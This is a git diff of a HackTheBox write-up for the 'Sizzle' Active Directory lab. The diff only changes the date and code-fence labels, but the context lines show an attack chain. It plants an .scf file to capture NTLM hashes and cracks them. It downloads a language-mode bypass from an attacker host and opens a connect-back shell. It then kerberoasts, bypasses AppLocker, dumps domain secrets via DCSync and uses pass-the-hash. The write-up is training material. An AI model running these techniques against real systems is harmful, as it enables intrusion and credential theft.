@@ -1,6 +1,6 @@
 ---
 title: "Sizzle"
-date: 2025-06-20
+date: 2024-11-24
 categories:
   - HackTheBox
   - Active Directory
@@ -16,7 +16,7 @@ tags:
 
 ## Enumeration
 
-```bash
+```shell
 $ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.10.103
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 09:36 CET
 Nmap scan report for 10.10.10.103
@@ -124,7 +124,7 @@ Let's fuzz the directory for new paths; nothing.
 
 In `smb` there is a share with empty access. Inside, there are a bunch of media files and directories with user names. Let's kerbrute these names.
 
-```bash
+```shell
 $ sudo mount -t cifs //10.10.10.103/Department\ shares mount -o domain=htb.local
 Password for root@//10.10.10.103/Department shares: 
 
@@ -256,7 +256,7 @@ We got `amanda`.
 
 Let's enumerate folder permissions to find a write permission. We can write in `Public`.
 
-```bash
+```shell
 $ sudo mount -t cifs //10.10.10.103/Department\ shares mount                                
 Password for root@//10.10.10.103/Department shares: 
 
@@ -265,7 +265,7 @@ $ sudo touch mount/Users/Public/asdf.txt
 
 But we can search all the writable folders with a little bash one-liner.
 
-```bash
+```shell
 $ for directory in $(ls Users); do echo -e "\n[+] Enumerating $directory perms:\n"; echo -e "\t$(smbcacls "//10.10.10.103/Department Shares" Users/$directory -N | grep "Everyone")"; done;
 
 [+] Enumerating amanda perms:
@@ -298,7 +298,7 @@ ACL:Everyone:ALLOWED/OI|CI|I/READ
 
 There is another way without using `smbcacls`, only trying to write in every folder
 
-```bash
+```shell
 $ for directory in $(find . -type d); do sudo touch "$directory/file" 2>/dev/null && echo -e "\033[32m[+] $directory is WRITABLE\033[0m" || echo -e "\033[31m[-] $directory is not writable\033[0m"; sudo rm -f "$directory/file" 2>/dev/null; done
 [-] . is not writable
 [-] ./Accounting is not writable
@@ -323,7 +323,7 @@ We can try to steal the NTLM hash by saving a `.scf` file ([reference](https://o
 
 So we save a `test.scf` in a writable folder and create a `smbshare`
 
-```bash
+```shell
 [Shell]
 Command=2
 IconFile=\\10.10.14.11\test.ico
@@ -331,7 +331,7 @@ IconFile=\\10.10.14.11\test.ico
 Command=ToggleDesktop
 ```
 
-```bash
+```shell
 $ impacket-smbserver -smb2support asdf .
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -355,7 +355,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 We have the hash for `amanda`, using `hashcat`:
 
-```bash
+```shell
 $ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt 
 hashcat (v6.2.6) starting
 
@@ -373,7 +373,7 @@ Enumerating directories with the `iis` wordlist, we have a `/certsrv` that asks 
 
 We can generate a private key and a CSR and have the CA sign it.
 
-```bash
+```shell
 $ openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr 
 ......+.....+.........+....+......+........+.+.........+.....+.+...........+...+...+....+++++++++++++++++++++++++++++++++++++++*.....+...+.....+...+...+....+..+.+.....+..........+..+..........+..+...+......+.+...+......+.....+....+...........+......+.+..+.+.....+.+........+............+....+..+.............+..+.........+...+...+++++++++++++++++++++++++++++++++++++++*..+............+...+......+.......+.....+...+...................+...+..+.+..+.........+....+..+..........+...+......+...+..++++++
 ..+....+..+.........+++++++++++++++++++++++++++++++++++++++*..+....+.........+...+..+.........................+..+.+.....+....+.........+..+....+......+..+...+....+.....+...+...............+...+....+...+..+++++++++++++++++++++++++++++++++++++++*................+.........+.+......+......+........+.+...+...+..+..........+..+.............+..+...+.+..+....+...............+...+...........+.+.....+...+.+......+.........+..+...+......+...+......+........................+.......+.....+....+..+....+...+...+.....+.........+.+..+.......+.....+......+....+.....+...+.......+.........+.........+........+.........+...+.+..+....+...+........+.......+......+............+.....+.........+.........+.......+........+....+......+......+...+......+..+....+......+..+...+.......+...+..+.......+.........+......+...+..+.....................+...+....+.....+...+....+...+.....+..........+......+.....+......+....+............+...+...........+.+..+...+...+......+.+............+...+.........+........+.+.....+.......+.....+.......+.....+......+.......+........+.+...........+...+..........+.....+...................+.....+.+.....+....+......+..+....+........+............+.+..+...+....+.....+...+.......+...+......+..+.........+...+...+............+...+.......+......+...........+.+...............+...+..+.........+..........+...+......+............+..+..........+...........+....+.....+......+......+..........+........+......+....+........+.........+......+...+....+...+...+.........+..+........................+....+..+.+...+.....+.+........+.+..+....+........+...+....+..............+....+..+......+....+........+......+.+........+..........+..+.+..+......................+.....+.+..+............+.+...+.........+...+..+.+..+.............+...............+.....+.+..............+......+...+...+...+....+........+...+....+...............+...+..+.+......+...+..+......+....+.......................+.............+..+...+....+......+.........+.....+.+...+.....+............+....+...+..++++++
@@ -404,7 +404,7 @@ Paste the CSR to the webpage and get the signed cert.
 
 ## Initial Access
 
-```bash
+```shell
 $ evil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103
 
 Evil-WinRM shell v3.7
@@ -421,7 +421,7 @@ amanda
 
 So at this point with these creds, try to make a kerberoast attack. The problem is that Kerberos `port 88` is not open, so let's try from inside, with `Rubeus`
 
-```bash
+```shell
 *Evil-WinRM* PS C:\Users\amanda\Documents> upload /home/kali/Downloads/Rubeus.exe
                                         
 Info: Uploading /home/kali/Downloads/Rubeus.exe to C:\Users\amanda\Documents\Rubeus.exe
@@ -436,7 +436,7 @@ At line:51 char:12
 
 We have a problem: PowerShell is not in full language mode, so we have to bypass it. [https://github.com/padovah4ck/PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM)
 
-```bash
+```shell
 *Evil-WinRM* PS C:\Users\amanda\Documents> Invoke-WebRequest -Uri http://10.10.14.11:8000/PsBypassCLM.exe -OutFile .\bypass.exe
 *Evil-WinRM* PS C:\Users\amanda\Documents> ls
 
@@ -472,7 +472,7 @@ Trying to connect back...
 
 And we have a shell with full language mode. Now back to uploading `Rubeus`.
 
-```bash
+```shell
 PS C:\Temp> .\Rubeus.exe
 ERROR: Program 'Rubeus.exe' failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1
 + .\Rubeus.exe
@@ -481,7 +481,7 @@ ERROR: Program 'Rubeus.exe' failed to run: This program is blocked by group poli
 
 A policy doesn't allow us to execute apps. Let's examine it.
 
-```bash
+```shell
 PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 PublisherConditions : {*\*\*,0.0.0.0-*}
@@ -508,7 +508,7 @@ Action              : Allow
 
 So inside `windows` we can do it from `C:\Windows\Temp`, that is allowed.
 
-```bash
+```shell
 PS C:\Windows\Temp> .\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
 
    ______        _                      
@@ -568,7 +568,7 @@ PS C:\Windows\Temp> .\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpass
 
 Using john
 
-```bash
+```shell
 $ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
@@ -582,7 +582,7 @@ Session completed.
 
 Execute secretsdump because mrlky can DCSync the domain.
 
-```bash
+```shell
 $ impacket-secretsdump htb.local/mrlky:'Football#7'@10.10.10.103
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -621,7 +621,7 @@ SIZZLE$:des-cbc-md5:4f8046b0f24629b9
 
 Now with PTH using wmiexec
 
-```bash
+```shell
 $ impacket-wmiexec htb.local/Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
